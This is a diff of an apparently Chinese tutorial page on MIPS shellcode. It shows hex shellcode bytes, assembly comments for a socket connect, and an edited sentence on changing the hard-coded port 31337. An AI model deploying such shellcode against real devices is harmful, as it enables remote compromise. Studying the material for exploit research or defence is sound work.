@@ -320,7 +320,7 @@ shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
 shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
 shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
 shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"</code></pre>
-<p>其实为了方便不用修改端口，因为端口31337（0x7a69）如果想改为9999（0x270f）需要</p>
+<p>其实为了方便不用修改端口，因为端口31337（0x7a69）更改需要修下面汇编代码中的0x6979和0xFF01。</p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#Socket FD is already in a0</span>
     #<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
     <span class="token macro property">#Connect sockaddr</span>
